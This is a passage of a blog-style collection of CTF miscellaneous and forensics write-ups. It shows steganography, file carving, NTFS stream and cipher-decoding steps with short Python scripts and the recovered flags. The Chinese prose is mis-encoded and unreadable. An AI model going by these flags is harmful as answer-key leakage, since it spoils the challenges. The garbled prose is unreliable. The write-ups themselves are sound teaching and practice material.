punctuation">(</span>data<span class="token punctuation">)</span>f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"result.txt"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span>res <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>data<span class="token punctuation">)</span>f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å¼€è„šæœ¬è¾“å‡ºçš„æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308311501267.png" alt="image-20230831150148240"></p><p>å¾ˆæ˜æ˜¾è¿™æ˜¯ä¸€ä¸ªzipå‹ç¼©åŒ…</p><p>æˆ‘ä»¬æ”¹åç¼€ä¸ºzipæ‰“å¼€ï¼Œå‘ç°äº†flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308311502949.png" alt="image-20230831150252916"></p><p>base64è§£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res/flag.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> f<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—åˆ°çš„flagï¼š</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPU-2019-ä¼Ÿå¤§çš„ä¾¦æ¢"><a href="#SWPU-2019-ä¼Ÿå¤§çš„ä¾¦æ¢" class="headerlink" title="[SWPU 2019]ä¼Ÿå¤§çš„ä¾¦æ¢"></a>[SWPU 2019]ä¼Ÿå¤§çš„ä¾¦æ¢</h1><p>æ‰“å¼€å‹ç¼©åŒ…æœ‰ä¸€ä¸ªæ–‡ä»¶å¤¹å’Œä¸€ä¸ªtxtæ–‡æœ¬</p><p><img src="https://imag.keyblue.cn/imag/202308301859149.png" alt="image-20230830185950098"></p><p>æ–‡ä»¶å¤¹æ¯åŠ å¯†äº†ï¼Œæˆ‘ä»¬æ‰“å¼€<code>å¯†ç .txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308301900883.png" alt="image-20230830190032862"></p><p>æ˜¯ä¸¤ä¸²ä¹±ç </p><p>ç”¨010æ‰“å¼€<code>å¯†ç .txt</code>ï¼Œåˆ‡æ¢å­—ç¬¦é›†ä¸ºEBCDIC</p><p><img src="https://imag.keyblue.cn/imag/202308301908474.png" alt="image-20230830190823454"></p><p>å¾—åˆ°äº†ï¼š</p><pre class="line-numbers language-none"><code class="language-none">wllm_is_the_best_team!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²è§£å‹å‰©ä¸‹çš„å†…å®¹</p><p>æ˜¯ä¸€å †è·³èˆçš„å°äºº</p><p><img src="https://imag.keyblue.cn/imag/202308301912749.png" alt="image-20230830191249707"></p><p>è§£ç å›¾</p><p><img src="https://imag.keyblue.cn/imag/202308301934989.jpg" alt="è·³èˆçš„å°äººå¯¹åº”è¡¨"></p><p>è§£å¯†å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">iloveholmesandwllm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPU-2019-æ¼‚æµè®°çš„é©¬é‡Œå¥¥"><a href="#SWPU-2019-æ¼‚æµè®°çš„é©¬é‡Œå¥¥" class="headerlink" title="[SWPU 2019]æ¼‚æµè®°çš„é©¬é‡Œå¥¥"></a>[SWPU 2019]æ¼‚æµè®°çš„é©¬é‡Œå¥¥</h1><p>é¢˜ç›®ç»™çš„æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼ŒåŒå‡»è¿è¡Œä¼šåˆ›å»º1.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271956089.png" alt="image-20230827195658049"></p><p><img src="https://imag.keyblue.cn/imag/202308271957280.png" alt="image-20230827195710245"></p><p>ä½¿ç”¨010æ‰“å¼€æ–‡ä»¶ï¼Œå‘ç°æœ«å°¾æ˜¯ä¸ªrarå‹ç¼©åŒ…ä»¥åŠntfså’Œflag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308271959190.png" alt="image-20230827195901155"></p><p>åœ¨cmdä¸­ä½¿ç”¨<code>dir /r</code>å‘½ä»¤å¯ä»¥å‘ç°<code> 1.txt:flag.txt</code></p><p><img src="https://imag.keyblue.cn/imag/202308272104590.png" alt="image-20230827210410554"></p><p>æœ€åä½¿ç”¨<code>notepad 1.txt:flag.txt</code>å¯ä»¥æŸ¥çœ‹éšè—çš„å†…å®¹</p><p><img src="https://imag.keyblue.cn/imag/202308272105464.png" alt="image-20230827210502434"></p><p>å¾—åˆ°flagå€¼swupctf{ddg_is_cute}</p><h1 id="SWPU-2019-ç¥å¥‡çš„äºŒç»´ç "><a href="#SWPU-2019-ç¥å¥‡çš„äºŒç»´ç " class="headerlink" title="[SWPU 2019]ç¥å¥‡çš„äºŒç»´ç "></a>[SWPU 2019]ç¥å¥‡çš„äºŒç»´ç </h1><p>ä½¿ç”¨<code>foremost -i MISC-ç¥å¥‡çš„äºŒç»´ç -BitcoinPay.png</code>æœªåˆ†ç¦»å‡ºå†…å®¹</p><p><img src="https://imag.keyblue.cn/imag/202308271014365.png" alt="foremoståˆ†ç¦»"></p><p>ä½¿ç”¨<code>binwalk -e *.png --run-as=root</code>åˆ†ç¦»å‡ºå¤šä¸ªrarå‹ç¼©åŒ…</p><p><img src="https://imag.keyblue.cn/imag/202308271016763.png" alt="image-20230827101620731"></p><p><img src="https://imag.keyblue.cn/imag/202308271019800.png" alt="image-20230827101958767"></p><ul><li><p>è§£å¯†<code>flag.doc</code>ä¸­çš„å†…å®¹ï¼Œå¾—åˆ°<code>comEON_YOuAreSOSoS0great</code>ï¼Œæ®æµ‹è¯•æ˜¯<code>18394.rar</code>çš„å¯†ç ï¼Œè§£å¼€å‹ç¼©åŒ…å¾—åˆ°<code>good.mp3</code></p></li><li><p>è§£å¯†<code>encode.txt</code>ä¸­çš„å†…å®¹å¾—åˆ°<code>asdfghjkl1234567890</code>ï¼Œæ®æµ‹è¯•æ˜¯<code>çœ‹çœ‹flagåœ¨ä¸åœ¨é‡Œé¢^_^.rar</code> çš„å¯†ç ï¼Œè§£å¼€å‹ç¼©åŒ…å¾—åˆ°<code>flag.jpg</code></p></li></ul><p>ä½¿ç”¨<code>Audacity64.exe</code>æ‰“å¼€<code>good.mp3</code>å‘ç°æ˜¯è«æ–¯ç”µç ï¼Œè®°å½•å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">-- --- .-. ... . .. ... ...- . .-. -.-- ...- . .-. -.-- . .- ... -.--è§£ç åï¼šmorseisveryveryeasy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æäº¤flag</p><h1 id="SWPU-2020-å¥—å¨ƒ"><a href="#SWPU-2020-å¥—å¨ƒ" class="headerlink" title="[SWPU 2020]å¥—å¨ƒ"></a>[SWPU 2020]å¥—å¨ƒ</h1><p>ä½¿ç”¨<code>binwalk</code>åˆ†ç¦»æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308271106253.png" alt="image-20230827110617216"></p><p>åˆ†ç¦»å‡ºä¸€ä¸ªå‹ç¼©åŒ…å†…å«ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308271109438.png" alt="image-20230827110902406"></p><p>æ‰“å¼€txtæ–‡ä»¶å‘ç°å†…éƒ¨æ˜¯rc4å¯†æ–‡<code>U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p</code>ï¼Œéœ€è¦æ‰¾åˆ°key</p><p><img src="https://imag.keyblue.cn/imag/202308271110484.png" alt="image-20230827111004446"></p><p>å¯¹swpu.xlsè§£å‹ï¼Œå†…éƒ¨å«æœ‰ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308271112716.png" alt="image-20230827111208681"></p><p>è§£å‹rc4key.zipéœ€è¦å¯†ç ï¼Œesayrc4.xlsxæ— æ³•å†æ¬¡è§£å‹ï¼Œéšå³ä½¿ç”¨010æ‰“å¼€æŸ¥çœ‹ï¼Œ</p><p><img src="https://imag.keyblue.cn/imag/202308271114279.png" alt="image-20230827111437244"></p><p>æ‹‰åˆ°æœ€åï¼Œå‘ç°å¯†ç ä¸º<code>6e4c834d77cba03af41e1562a5bce84e</code></p><p>ä½¿ç”¨åœ¨åœ¨çº¿è§£å¯†å·¥å…·å¾—åˆ°æ˜æ–‡ä¸º<code>ef1a73d40977a49b99b871980f355757</code></p><p><img src="https://imag.keyblue.cn/imag/202308271116714.png" alt="image-20230827111624674"></p><h1 id="SWPU-2020-æ‰¾æ‰¾å§"><a href="#SWPU-2020-æ‰¾æ‰¾å§" class="headerlink" title="[SWPU 2020]æ‰¾æ‰¾å§"></a>[SWPU 2020]æ‰¾æ‰¾å§</h1><p>é¢˜ç›®çš„é™„ä»¶éœ€è¦è§£å‹å¯†ç </p><p><img src="https://imag.keyblue.cn/imag/202308280843443.png" alt="image-20230828084348396"></p><p>ä½¿ç”¨binwalkåˆ†ç¦»æ— æœ</p><p>ä½¿ç”¨foremoståˆ†ç¦»æ— æœ</p><p>ä½¿ç”¨010æ‰“å¼€é™„ä»¶ï¼Œç›´æ¥æ‹‰åˆ°æœ€åï¼Œå‘ç°äº†key</p><p><img src="https://imag.keyblue.cn/imag/202308280851443.png" alt="image-20230828085125413"></p><p>å‹ç¼©åŒ…å†…æœ‰ä¸€ä¸ªmp3æ–‡ä»¶å’Œä¸€ä¸ªå‹ç¼©åŒ…ï¼Œmp3æ–‡ä»¶ä½¿ç”¨Audacityæ‰“å¼€ï¼Œåœ¨éŸ³é¢‘çš„æœ€åå‘ç°äº†åƒæ‘©æ–¯å¯†ç çš„å†…å®¹</p><p><img src="https://imag.keyblue.cn/imag/202308280856684.png" alt="image-20230828085623626"></p><p><img src="https://imag.keyblue.cn/imag/202308280857191.png" alt="image-20230828085729160"></p><p>è®°å½•å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">-.. ....- ...-- ----. -.... ...-- . ----. ..--- -... ----- .---- ..--- .- .- -...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£ç å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">d43963e92b012aab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨æ­¤å­—ç¬¦ä¸²åšå‹ç¼©åŒ…å¯†ç ï¼Œæ˜¾ç¤ºå¯†ç é”™è¯¯ã€‚</p><p>çŒœæµ‹å¯èƒ½æ˜¯md5å€¼ï¼Œéšæœºåœ¨çº¿è§£å¯†ã€‚å¾—åˆ°æ˜æ–‡</p><pre class="line-numbers language-none"><code class="language-none">n1ce_try<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨çº¿è§£å¯†ç½‘ç«™ï¼š<a href="https://www.somd5.com/">https://www.somd5.com/</a></p><p><img src="https://imag.keyblue.cn/imag/202308280908162.png" alt="image-20230828090823133"></p><p>è§£å‹ç¼©å¾—åˆ°ä¸¤å¼ å›¾ç‰‡</p><p><img src="https://imag.keyblue.cn/imag/202308280913593.png" alt="image-20230828091328566"></p><p>å°†gifå›¾ç‰‡ä½¿ç”¨movgear-gifæ‰“å¼€ï¼Œçœ‹åˆ°æŸä¸€å¸§å¸¦æœ‰ä¸€ä¸²å­—ç¬¦</p><p><img src="https://imag.keyblue.cn/imag/202308280917493.png" alt="image-20230828091736418"></p><p>è¯†åˆ«åˆ°flagå€¼</p><p><img src="https://imag.keyblue.cn/imag/202308280918288.png" alt="image-20230828091825248"></p><p>éšå³æäº¤ä½†æ˜¯é”™è¯¯</p><p>ä¼¼ä¹æ˜¯å‡¯æ’’å¯†ç ï¼Œæ‰¹é‡è§£å¯†</p><p><img src="https://imag.keyblue.cn/imag/202308280955841.png" alt="image-20230828095511800"></p><p>å¾—åˆ°flagå€¼ï¼šsWpu_N1c3_Try</p><h1 id="SWPU-2020-è€—å­å°¾æ±"><a href="#SWPU-2020-è€—å­å°¾æ±" class="headerlink" title="[SWPU 2020]è€—å­å°¾æ±"></a>[SWPU 2020]è€—å­å°¾æ±</h1><p>ä¸Šæ¥å…ˆåˆ†ç¦»è¯•è¯•</p><p><img src="https://imag.keyblue.cn/imag/202308301022883.png" alt="image-20230830102234837"></p><p>æ‰“å¼€å…¶ä¸­ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢æœ‰flag.txt</p><p><img src="https://imag.keyblue.cn/imag/202308301023182.png" alt="image-20230830102319142"></p><p>è¿™æ˜¯ä¸€ä¸ªé”™è¯¯çš„flag</p><p>åœ¨å¦ä¸€ä¸ªå‹ç¼©åŒ…å«æœ‰ä¸€ä¸ªè§†é¢‘æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308301024886.png" alt="image-20230830102414856"></p><p>çœ‹æ¥æ˜¯ä¸ªè§†é¢‘éšå†™</p><p>æ’­æ”¾è§†é¢‘ï¼Œæš‚åœçœ‹åˆ°ä¸€ä¸²å­—ç¬¦</p><p><img src="https://imag.keyblue.cn/imag/202308301025784.png" alt="image-20230830102550742"></p><p><code>c2lnbl9pbg==</code></p><p>ä½¿ç”¨å·¥å…·è§£ç <img src="https://imag.keyblue.cn/imag/202308301027011.png" alt="image-20230830102755978"></p><p>å°†è§†é¢‘å†æ¬¡åˆ†ç¦»</p><p><img src="https://imag.keyblue.cn/imag/202308301030639.png" alt="image-20230830103023591"></p><p>å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…éœ€è¦å¯†ç æ‰èƒ½è§£å‹</p><p>äºæ˜¯æŠŠåˆšåˆšè§£ç å¾—åˆ°çš„å­—ç¬¦ä¸²ä½œä¸ºå¯†ç è§£å‹</p><p>æ‰“å¼€è§£å‹åçš„æ–‡æœ¬æ–‡æ¡£</p><p><img src="https://imag.keyblue.cn/imag/202308301032566.png" alt="image-20230830103225517"></p><p>ç¿»è¯‘æ³¨é‡Šï¼šThe last layer is the single table replacement passwordï¼ˆ æœ€åä¸€å±‚æ˜¯å•è¡¨æ›¿æ¢å¯†ç   ï¼‰</p><p>åŸå¯†æ–‡ä¸º</p><pre class="line-numbers language-none"><code class="language-none">R1pCVE9OUlhHVTNES05SWkdZWVRNUVJYSEEzVEtOUlVHNFpUT09KWEdFM0RLTlJZRzRaVE9RSlhHRTNEUU5aWkdaQkRNTlpXRzQzVEdOWlpHNDRUTVFaV0lJM1RNTlpXR1k0UT09PT0&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64è§£å‹ä¸€æ¬¡å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">GZBTONRXGU3DKNRZGYYTMQRXHA3TKNRUG4ZTOOJXGE3DKNRYG4ZTOQJXGE3DQNZZGZBDMNZWG43TGNZZG44TMQZWII3TMNZWGY4Q&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base32è§£ç ä¸€æ¬¡å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">6C76756569616B7875647379716568737A7168796B67677379796C6B767669<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ASCIIè§£ç å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">lvueiakxudsyqehszqhykggsyylkvvi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä»¿å°„å¯†ç è§£ç å¾—åˆ°</p><pre class="line-numbers language-none"><code class="language-none">flagyouhavesignedinsuccessfully<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°æ–‡æœ¬æ–‡ä»¶çš„æ–‡ä»¶åä¸º19_20ï¼Œä»¿å°„å¯†ç aå’Œbçš„å€¼ä¹Ÿä¸º19_20</p><p><img src="https://imag.keyblue.cn/imag/202308301101298.png" alt="image-20230830110155260"></p><p><img src="https://imag.keyblue.cn/imag/202308301102498.png" alt="image-20230830110213462"></p><p>éœ€è¦æ³¨æ„çš„æ˜¯ç»è¿‡ä»¿å°„å¯†ç å¾—åˆ°çš„å­—ç¬¦ä¸²ä¸èƒ½ç›´æ¥æäº¤</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;you_have_signed_in_successfully&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-gifå¥½åƒæœ‰ç‚¹å¤§"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-gifå¥½åƒæœ‰ç‚¹å¤§" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]gifå¥½åƒæœ‰ç‚¹å¤§"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]gifå¥½åƒæœ‰ç‚¹å¤§</h1><p>ä½¿ç”¨foremostå’Œbinwalkåˆ†ç¦»æ–‡ä»¶æ— æœ</p><p>010æ‰“å¼€æ–‡ä»¶ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p><p>éšå³ä½¿ç”¨Stegsolve.jaræ‰“å¼€gifï¼Œé€‰æ‹©frame browseræ¨¡å¼</p><p><img src="https://imag.keyblue.cn/imag/202308271701553.png" alt="image-20230827170114514"></p><p>ä¸€ä¸ªä¸€å…±800å¤šå¸§ï¼Œåœ¨562å¸§å‘ç°ä¸€ä¸ªäºŒç»´ç </p><p><img src="https://imag.keyblue.cn/imag/202308271704355.png" alt="image-20230827170409299"></p><p>ä½¿ç”¨å¾®ä¿¡æˆ–è€…<code>QR Research</code>æ‰«ç </p><p><img src="https://imag.keyblue.cn/imag/202308271703623.png?x-image-process=style/style-d277" alt="image-20230827170317585"></p><p>å¾—åˆ°flagå€¼ä¸ºNSS{The_G1F_ls_T00_b1g}</p><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-zipbomb"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-zipbomb" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]zipbomb"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]zipbomb</h1><p>é¢˜ç›®è¯´ä¸è¦è§£å‹å‹ç¼©åŒ…</p><p>æˆ‘ä»¬ç”¨7zæ‰“å¼€å‹ç¼©åŒ…æŸ¥çœ‹ï¼Œæ²¡æœ‰å‘ç°</p><p><img src="https://imag.keyblue.cn/imag/202309021600258.png" alt="image-20230902160017196"></p><p>ä½¿ç”¨binwalkåˆ†ææ–‡ä»¶ï¼Œå‘ç°è¿˜æœ‰ä¸€ä¸ªå‹ç¼©åŒ…</p><p><img src="https://imag.keyblue.cn/imag/202309021604707.png" alt="image-20230902160430677"></p><p>éšå³ï¼Œbinwalkåˆ†ç¦»æ–‡ä»¶éœ€è¦æ‰‹åŠ¨æš‚åœï¼Œä¸ç„¶ä¼šæŠŠæ‰€æœ‰æ–‡ä»¶å¯¹åˆ†ç¦»å‡ºæ¥</p><p><img src="https://imag.keyblue.cn/imag/202309021606526.png" alt="image-20230902160636502"></p><p><img src="https://imag.keyblue.cn/imag/202309021606351.png" alt="image-20230902160648311"></p><p>ä¹Ÿå¯ä½¿ç”¨foremoståˆ†ç¦»ï¼Œæ— éœ€æ‰‹åŠ¨æš‚åœ</p><p><img src="https://imag.keyblue.cn/imag/202309021607443.png" alt="image-20230902160728420"></p><p>æ‰“å¼€ç¬¬äºŒä¸ªå‹ç¼©åŒ…å³æ˜¯flahæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309021608078.png" alt="image-20230902160832034"></p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;Z1p_B00m_d1sp0sal&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-åŸæ¥ä½ ä¹Ÿç©åŸç¥"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-åŸæ¥ä½ ä¹Ÿç©åŸç¥" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]åŸæ¥ä½ ä¹Ÿç©åŸç¥"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]åŸæ¥ä½ ä¹Ÿç©åŸç¥</h1><p>å‹ç¼©åŒ…è§£å‹é”™è¯¯</p><p>æ‹–åˆ°kailiè¿›è¡Œåˆ†ç¦»</p><p><img src="https://imag.keyblue.cn/imag/202308310952535.png" alt="image-20230831095217476"></p><p>ä»€ä¹ˆä¹Ÿæ²¡åˆ†ç¦»å‡ºæ¥</p><p>kaliæ˜¾ç¤ºæ–‡ä»¶ç±»å‹</p><p><img src="https://imag.keyblue.cn/imag/202308311013762.png" alt="image-20230831101327721"></p><p>å‘ç°æ˜¯mp3æ ¼å¼æ–‡ä»¶</p><p>å°†æ–‡ä»¶åç¼€æ”¹ä¸ºmp3ï¼Œç”¨Audacityæ‰“å¼€</p><p><img src="https://imag.keyblue.cn/imag/202308311015777.png" alt="image-20230831101534739"></p><p>æ²¡æœ‰å‘ç°éŸ³é¢‘éšå†™</p><p>éšå³ä½¿ç”¨MP3Stegoè§£ç </p><p><img src="https://imag.keyblue.cn/imag/202308311016529.png" alt="image-20230831101640493"></p><p>æ‰“å¼€åˆ†æå‡ºæ¥çš„txtæ–‡æœ¬</p><p><img src="https://imag.keyblue.cn/imag/202308311017165.png" alt="image-20230831101725129"></p><pre class="line-numbers language-none"><code class="language-none">504b 0304 1400 0900 0800 6db2 3c53 16020d75 3600 0000 7902 0000 0800 0000 74657374 2e74 7874 edc4 410a 0010 1005 d0c32976 3663 ff9b a428 8cc2 4272 7797 b0f416cf 1229 a7ff ffb7 6f12 2c99 e0dc 052df382 09b5 c754 914a 633f ce05 504b 01023f00 1400 0000 0800 6db2 3c53 1602 0d753600 0000 7902 0000 0800 2400 0000 00000000 2000 0000 0000 0000 7465 7374 2e747874 0a00 2000 0000 0000 0100 1800 054d41d7 73b4 d701 a780 52db 73b4 d701 cfdcaa53 73b4 d701 504b 0506 0000 0000 01000100 5a00 0000 5c00 0000 0000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imag.keyblue.cn/imag/202308311019735.png" alt="image-20230831101949700"></p><p>å‘ç°æ˜¯ä¸ªzipå‹ç¼©åŒ…ï¼Œzipçš„æ–‡ä»¶å¤´æ˜¯<code>504b 0304</code></p><p>å‹ç¼©åŒ…éœ€è¦å¯†ç æ‰èƒ½æ‰“å¼€ï¼ŒçŒœæµ‹æ˜¯ä¸ªä¼ªåŠ å¯†ï¼Œæ”¹09ä¸º00</p><p><img src="https://imag.keyblue.cn/imag/202308311022721.png" alt="image-20230831102223698"></p><p>æˆåŠŸæ‰“å¼€å‹ç¼©åŒ…</p><p><img src="https://imag.keyblue.cn/imag/202308311023070.png" alt="image-20230831102310035"></p><p>flagï¼š</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;So_you_also_play_Genshin_impact&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-æˆ‘flagå‘¢ï¼Ÿ"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-æˆ‘flagå‘¢ï¼Ÿ" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]æˆ‘flagå‘¢ï¼Ÿ"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]æˆ‘flagå‘¢ï¼Ÿ</h1><p>æ‰“å¼€æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202308311317637.png" alt="image-20230831131708601"></p><p>è¯é¢‘ç»Ÿè®¡</p><pre class="line-numbers language-none"><code class="language-none">from collections import Counterimport reflag &#x3D; &#39;&#39;with open(&#39;res&#x2F;é™„ä»¶.txt&#39;, &#39;r&#39;) as f:    for line in f:        text &#x3D; linetext &#x3D; re.findall(&quot;&#123;(.*?)&#125;&quot;, text)for i in text:    flag +&#x3D; iwordcount &#x3D; Counter(flag.lower())wordcount &#x3D; wordcountprint(wordcount)for i in wordcount:    print(i[0], end&#x3D;&#39;&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¢˜ç›®ç»™çš„æ–‡æœ¬æ˜¯ä¸¤è¡Œï¼Œæˆ‘ä»¬æŠŠä¸¤è¡Œåˆå¹¶æˆä¸€è¡Œä¿å­˜åå†è¿è¡Œè„šæœ¬</p><p>è¿è¡Œè„šæœ¬</p><p><img src="https://imag.keyblue.cn/imag/202308311343946.png" alt="image-20230831134334915"></p><pre class="line-numbers language-none"><code class="language-none">yourflagis81e57d2bc90364t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å› ä¸ºtåªå‡ºç°äº†ä¸€æ¬¡</p><p>æ‰€ä»¥æœ€åçš„flagä¸º</p><pre class="line-numbers language-none"><code class="language-none">NSSCTF&#123;81e57d2bc90364&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="UTCTF-2020-Zero"><a href="#UTCTF-2020-Zero" class="headerlink" title="[UTCTF 2020]Zero"></a>[UTCTF 2020]Zero</h1><p>æ˜¯é›¶å®½éšå†™</p><p><img src="https://imag.keyblue.cn/imag/202309011406892.png" alt="image-20230901140656857"></p><p><a href="https://www.mzy0.com/ctftools/zerowidth1/">é›¶å®½éšå†™åœ¨çº¿è§£å¯†</a></p><p>å°†æ–‡æœ¬å¤åˆ¶åˆ°ç½‘ç«™è§£å¯†å³å¯</p><p><img src="https://imag.keyblue.cn/imag/202309011406263.png" alt="image-20230901140642209"></p><pre class="line-numbers language-none"><code class="language-none">utflag&#123;whyNOT@sc11_4927aajbqk14&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="ç¾ŠåŸæ¯-2021-Baby-Forenisc"><a href="#ç¾ŠåŸæ¯-2021-Baby-Forenisc" class="headerlink" title="[ç¾ŠåŸæ¯ 2021]Baby_Forenisc"></a>[ç¾ŠåŸæ¯ 2021]Baby_Forenisc</h1><p>æŸ¥çœ‹å†å²å‘½ä»¤</p><p><img src="https://imag.keyblue.cn/imag/202309041542425.png" alt="image-20230904154233373"></p><p>ç”±å†å²å‘½ä»¤å¯çŸ¥ï¼Œflagå’Œgitæœ‰å…³</p><p>æŸ¥çœ‹ie</p><p><img src="https://imag.keyblue.cn/imag/202309041455659.png" alt="image-20230904145506659"></p><p> æŸ¥æ‰¾ssh.txtæ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309041502213.png" alt="image-20230904150218179"></p><p>ä¿å­˜æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309041505277.png" alt="image-20230904150504247"></p><p>base64è§£ç ä¿å­˜çš„æ–‡ä»¶</p><p><img src="https://imag.keyblue.cn/imag/202309041510800.png" alt="image-20230904151044768"></p><p>å‘ç°äº†ä¸€ä¸ªQQé‚®ç®±</p><pre class="line-numbers language-none"><code class="language-none">song552085107@qq.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”¨githubæœç´¢ç”¨æˆ·</p><p><img src="https://imag.keyblue.cn/imag/202309041604232.png" alt="image-20230904160428206"></p><p>åœ¨è¿™ä¸ªäººçš„ä»“åº“é‡Œæ‰¾åˆ°<code>__APP__</code>ä¸‹è½½æŸ¥çœ‹</p><p>ç”¨010æ‰“å¼€æ–‡ä»¶ï¼Œé€‰æ‹©textæ¨¡å¼</p><p><img src="https://imag.keyblue.cn/imag/202309041603994.png" alt="image-20230904160316948"></p><p>åœ¨2169è¡Œæ‰¾åˆ°äº†ä¸€è¡Œbase64ç¼–ç ï¼Œè§£ç å¾—åˆ°flag</p><p><img src="https://imag.keyblue.cn/imag/202309041606307.png" alt="image-20230904160642272"></p><pre class="line-numbers language-none"><code 